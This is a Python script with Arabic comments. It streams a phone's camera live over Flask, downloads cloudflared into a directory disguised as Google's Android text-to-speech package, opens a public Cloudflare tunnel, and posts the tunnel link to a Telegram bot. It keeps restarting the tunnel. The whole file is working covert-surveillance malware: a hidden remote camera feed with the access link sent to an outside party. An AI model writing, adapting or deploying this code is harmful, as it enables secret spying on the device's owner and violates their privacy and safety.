import os
import time
import threading
import requests
import subprocess
import cv2
import numpy as np
from flask import Flask, Response

# ------------------ الإعدادات (يُفضل جلبها من Secrets) ------------------
TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"          # استبدل
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"                    # استبدل
# -----------------------------------------------------------------------

app = Flask(__name__)

# مسار تخزين ملف cloudflared داخل التطبيق (مسار آمن)
BINARY_PATH = "/data/data/com.google.android.tts_v2/files/cloudflared"

def generate_frames():
    """بث الكاميرا الخلفية بشكل مباشر (MJPEG stream)"""
    camera = cv2.VideoCapture(0)  # 0 = الكاميرا الخلفية
    while True:
        success, frame = camera.read()
        if not success:
            break
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
    camera.release()

@app.route('/live')
def video_feed():
    """مسار البث المباشر"""
    return Response(generate_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

def download_cloudflared():
    """تحميل نسخة ARM64 من cloudflared إذا لم تكن موجودة"""
    if not os.path.exists(BINARY_PATH):
        try:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            r = requests.get(url, stream=True)
            with open(BINARY_PATH, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            os.chmod(BINARY_PATH, 0o755)
        except Exception as e:
            print(f"Failed to download cloudflared: {e}")

def start_tunnel():
    """تشغيل نفق Cloudflare وإرسال الرابط إلى تليجرام"""
    download_cloudflared()
    cmd = [BINARY_PATH, "tunnel", "--url", "http://localhost:8080"]
    process = subprocess.Popen(cmd,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT,
                               text=True,
                               bufsize=1)
    for line in iter(process.stdout.readline, ''):
        if "trycloudflare.com" in line:
            # استخراج الرابط من السطر
            words = line.split()
            for w in words:
                if "trycloudflare.com" in w:
                    tunnel_url = w.strip() + "/live"
                    # إرسال الرابط إلى تليجرام
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                  data={'chat_id': TELEGRAM_CHAT_ID,
                                        'text': f"Tunnel Ready: {tunnel_url}"})
                    break
            break
    # إذا انتهى النفق لأي سبب، نعيد المحاولة بعد 5 ثوانٍ
    time.sleep(5)
    start_tunnel()

if __name__ == '__main__':
    # تشغيل Flask في خلفية
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080,
                                            debug=False, use_reloader=False),
                     daemon=True).start()
    # تشغيل النفق
    start_tunnel()
